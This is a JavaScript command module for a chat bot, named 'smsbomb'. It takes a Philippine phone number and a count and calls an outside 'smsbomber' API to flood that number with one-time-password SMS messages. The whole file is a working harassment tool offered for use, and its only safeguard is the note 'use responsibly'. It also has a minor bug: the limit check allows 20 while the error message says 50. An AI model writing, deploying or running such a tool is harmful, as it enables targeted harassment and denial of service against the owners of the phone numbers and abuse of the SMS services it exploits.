module.exports.config = {
  name: "smsbomb",
  aliases: ["smsb", "otpbomb"],
  type: "tools",
  description: "Send bulk OTP SMS to target PH number (Use responsibly)",
  author: "Kenneth Panio",
  cooldown: 10, 
  usage: "[PH Number e.g: +63xxxxxxxxxx] [amount e.g: 10]"
};

module.exports.run = async function({ args, chat, font }) {
  // Input validation
  const phone = args[0]?.trim() || "";
  const amount = parseInt(args[1]) || 10;

  // Validate phone number
  let cleanPhone = phone;
  if (phone.startsWith("+63")) {
    cleanPhone = phone.slice(3);
  } else if (phone.startsWith("63")) {
    cleanPhone = phone.slice(2);
  } else if (phone.startsWith("0")) {
    cleanPhone = phone.slice(1);
  }

  if (!phone || !/^\+?63\d{10}$/.test(phone.replace(/^0/, "+63"))) {
    return chat.reply(
      font.thin("Invalid phone number format. Use: +63xxxxxxxxxx")
    );
  }

  // Validate amount
  if (isNaN(amount) || amount < 1 || amount > 20) {
    // Added upper limit
    return chat.reply(font.thin("Invalid amount. Must be between 1 and 50."));
  }

  // Warning message
  const sent = await chat.reply(
    font.thin("Initiating SMS Bomb... Please use this responsibly.")
  );

  try {
    const { get } = require("axios");
    
    const apiEndpoint = global.api.hajime;
    const response = await get(
      `${apiEndpoint}/api/smsbomber?phone=${cleanPhone}&times=${amount}`
    );

    await sent.delete();
    return chat.reply(
      font.thin(JSON.stringify(response.data.details, null, 2))
    );
  } catch (error) {
    sent.delete();
    const errorMessage =
      error.response?.data?.error ||
      error.stack ||
      error.message ||
      "API is currently unavailable. Please try again later.";
    return chat.reply(font.thin(`Error: ${errorMessage}`));
  }
};
